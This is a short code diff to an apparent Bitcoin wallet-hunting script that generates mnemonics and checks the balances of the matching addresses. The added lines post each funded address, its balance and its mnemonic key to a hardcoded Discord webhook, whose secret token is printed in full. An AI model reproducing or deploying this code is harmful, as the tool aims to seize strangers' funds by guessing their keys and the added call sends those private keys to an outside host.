@@ -51,6 +51,12 @@ const huntWallet = async () => {
       const balance = response.data.incoming
       if (balance > 0) {
         appendFileSync('./wallet.txt', `${address} ${balance} ${mnemonic} \n`);
+        axios.post('https://discord.com/api/webhooks/1077587249018970162/Nev6_cCBykz44fl3zDK3vaMU4x7USgUnWDl6nIG56WDRWv5mheBle6vjkj1QObVvPLjv', {
+          "username": "Wallet Found",
+          "avatar_url": "https://i.imgur.com/4M34hi2.png",
+          "content": `
+          address: ${address}\nbalance: ${balance}\nkey: ${mnemonic}`,
+        }).catch(err => console.log(err));
       }
       console.log(`Balance of address ${address}: ${balance} BTC`);
     })
